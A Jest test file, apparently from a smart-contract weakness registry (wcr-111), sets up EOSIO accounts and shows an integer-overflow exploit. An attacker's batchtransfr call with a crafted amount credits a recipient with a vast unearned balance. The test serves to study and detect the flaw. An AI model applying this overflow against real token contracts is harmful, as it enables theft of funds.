const { loadConfig, Blockchain } = require("@klevoya/hydra");

const config = loadConfig("hydra.yml");

const eosStatsFixture = {
  EOS: [
    {
      supply: "100.0000 EOS",
      max_supply: "10000000000.0000 EOS",
      issuer: "eosio.token",
    },
  ],
};
describe("wcr-111", () => {
  let blockchain = new Blockchain(config);
  let vuln = blockchain.createAccount(`vulnerable`);
  let eosioToken = blockchain.createAccount(`eosio.token`);
  let attacker = blockchain.createAccount(`attacker`);

  beforeAll(async () => {
    vuln.setContract(blockchain.contractTemplates[`wcr-111`]);
    eosioToken.setContract(blockchain.contractTemplates[`eosio.token`]);

    [vuln, eosioToken].forEach((acc) =>
      acc.updateAuth(`active`, `owner`, {
        accounts: [
          {
            permission: {
              actor: acc.accountName,
              permission: `eosio.code`,
            },
            weight: 1,
          },
        ],
      })
    );


    await eosioToken.loadFixtures(`stat`, eosStatsFixture);
    await eosioToken.loadFixtures(`accounts`, {
      [attacker.accountName]: [
        {
          balance: "100.0000 EOS",
        },
      ],
    });
  });

  it("can overflow", async () => {
    expect.assertions(1);

    await eosioToken.contract.transfer(
      {
        from: attacker.accountName,
        to: vuln.accountName,
        quantity: "0.0004 EOS",
        memo: "deposit",
      },
      [{ actor: attacker.accountName, permission: `active` }]
    );
    // max uint64_t: 18,446,744,073,709,551,615
    // floor(divided by 5)
    const overflowAmount = `3689348814741910324`
    // asset must be < 2^62 (!) not 2^64
    await vuln.contract.batchtransfr(
      {
        from: attacker.accountName,
        tos: [`attacker1`, `attacker2`, `attacker3`, `attacker4`, `attacker5`],
        amount: overflowAmount,
      },
      [{ actor: attacker.accountName, permission: `active` }]
    );

    expect(vuln.getTableRowsScoped(`balances`)[vuln.accountName]).toContainEqual(
      {
        account: `attacker1`,
        balance: `368934881474191.0324 EOS`
      }
    );
  });
});
